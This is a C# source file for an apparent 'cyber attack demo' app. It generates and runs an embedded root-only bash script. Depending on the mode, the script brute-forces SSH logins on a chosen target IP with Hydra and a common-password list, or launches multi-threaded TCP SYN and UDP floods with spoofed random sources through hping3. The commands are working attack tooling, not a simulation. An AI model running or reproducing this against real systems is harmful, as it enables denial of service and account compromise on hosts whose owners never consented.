using System;
using System.Diagnostics;
using System.IO;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace CyberAttackDemo
{
    public class AttackEngine
    {
        // ログ出力イベント（UIに通知するため）
        public event Action<string>? OnLogReceived;
        
        public const string AttackScriptName = @"./Attack/attack.sh";

        // 外部コマンド実行 (timeoutSeconds引数あり)
        public async Task RunCommandAsync(string command, string args, int timeoutSeconds = 0)
        {
            try
            {
                var psi = new ProcessStartInfo
                {
                    FileName = command,
                    Arguments = args,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true,
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    StandardOutputEncoding = Encoding.UTF8,
                    StandardErrorEncoding = Encoding.UTF8
                };

                using var process = new Process { StartInfo = psi };

                // 標準出力
                process.OutputDataReceived += (s, e) => 
                {
                    if (!string.IsNullOrEmpty(e.Data))
                    {
                        // ここで翻訳ロジックを通す
                        string translated = LogTranslator.Translate(e.Data);
                        OnLogReceived?.Invoke(translated);
                    }
                };
                
                // エラー出力
                process.ErrorDataReceived += (s, e) =>
                {
                    if (!string.IsNullOrEmpty(e.Data))
                    {
                        OnLogReceived?.Invoke($"[STDERR] {e.Data}");
                    }
                };

                if (process.Start())
                {
                    process.BeginOutputReadLine();
                    process.BeginErrorReadLine();

                    if (timeoutSeconds > 0)
                    {
                        // タイムアウト設定がある場合
                        // スクリプト自体のタイムアウトより少し余裕を持たせる (+2秒)
                        using var cts = new CancellationTokenSource(TimeSpan.FromSeconds(timeoutSeconds + 2));
                        try
                        {
                            // 指定時間待機
                            await process.WaitForExitAsync(cts.Token);
                        }
                        catch (OperationCanceledException)
                        {
                            // タイムアウトした場合
                            OnLogReceived?.Invoke("[SYSTEM] Process timed out. Forcing kill...");
                            try
                            {
                                // プロセスツリーごと強制終了
                                process.Kill(true);
                            }
                            catch (Exception kex)
                            {
                                OnLogReceived?.Invoke($"[ERROR] Failed to kill process: {kex.Message}");
                            }
                        }
                    }
                    else
                    {
                        // タイムアウトなし
                        await process.WaitForExitAsync();
                    }
                }
            }
            catch (Exception ex)
            {
                OnLogReceived?.Invoke($"[ERROR] Command Execution Failed: {ex.Message}");
                
                // デモ用フォールバックメッセージ
                await Task.Delay(1000);
                if (command.Contains("bash") || args.Contains("attack.sh"))
                {
                     OnLogReceived?.Invoke("[SIMULATION] Executing shell script sequence...");
                }
                else
                {
                    OnLogReceived?.Invoke("Target appears to be secure or tool not installed.");
                }
            }
        }

        // 攻撃用シェルスクリプトの生成（上書き防止）
        public async Task EnsureAttackScriptExistsAsync()
        {
            try
            {
                string? dir = Path.GetDirectoryName(AttackScriptName);
                if (!string.IsNullOrEmpty(dir) && !Directory.Exists(dir))
                {
                    Directory.CreateDirectory(dir);
                    OnLogReceived?.Invoke($"[SYSTEM] Created directory: {dir}");
                }

                // 修正: ファイルが存在する場合は何もしない
                if (!File.Exists(AttackScriptName))
                {
                    string scriptContent = @"#!/bin/bash

# root権限チェック
if [ ""$EUID"" -ne 0 ]; then
  echo ""エラー: root権限で実行してください。""
  exit 1
fi

TARGET_IP=${1:-""127.0.0.1""}
DURATION=${2:-""15""}
MODE_ARG=${3:-""dos""}
SSH_USER=${4:-""root""}

PORT=80
THREADS=4

cleanup() {
    echo """"
    echo ""[!] 停止シグナルを受信しました。プロセスを停止中...""
    pkill -P $$ hping3
    pkill -P $$ hydra
    echo ""[*] 完了。""
    exit
}

trap cleanup SIGINT SIGTERM EXIT

echo ""==========================================""
echo ""   Cyber Attack Simulator Script""
echo ""==========================================""
echo ""[*] TARGET: $TARGET_IP""
echo ""[*] DURATION: $DURATION sec""
echo ""[*] MODE: $MODE_ARG""
echo ""------------------------------------------""

if [ ""$MODE_ARG"" = ""hydra"" ]; then
    # --- Hydra SSH Crack ---
    echo ""[*] Starting Hydra SSH Password Cracking...""
    echo ""[*] Target User: $SSH_USER""
    
    # デモ用パスワードリスト作成
    echo ""123456"" > passlist.txt
    echo ""password"" >> passlist.txt
    echo ""admin"" >> passlist.txt
    echo ""root"" >> passlist.txt
    echo ""kali"" >> passlist.txt
    
    # Hydra実行
    hydra -l $SSH_USER -P passlist.txt ssh://$TARGET_IP -t 4 -V -e ns
    
    rm passlist.txt

else
    # --- DoS Attack (hping3) ---
    echo ""[*] Starting DoS Flood Attack...""
    
    for (( i=1; i<=THREADS; i++ ))
    do
        # TCP SYN Flood
        hping3 -S --flood --rand-source -p $PORT $TARGET_IP > /dev/null 2>&1 &
        # UDP Flood
        hping3 --udp --flood -d 1200 -p $PORT $TARGET_IP > /dev/null 2>&1 &
    done
    
    wait
fi
";
                    await File.WriteAllTextAsync(AttackScriptName, scriptContent);
                    
                    try { Process.Start("chmod", $"+x {AttackScriptName}").WaitForExit(); } catch {}
                    
                    OnLogReceived?.Invoke($"[SYSTEM] Generated default attack script: {AttackScriptName}");
                }
                else
                {
                    OnLogReceived?.Invoke($"[SYSTEM] Using existing attack script: {AttackScriptName}");
                }
            }
            catch (Exception ex)
            {
                OnLogReceived?.Invoke($"[ERROR] Failed to check/generate script: {ex.Message}");
            }
        }
    }
}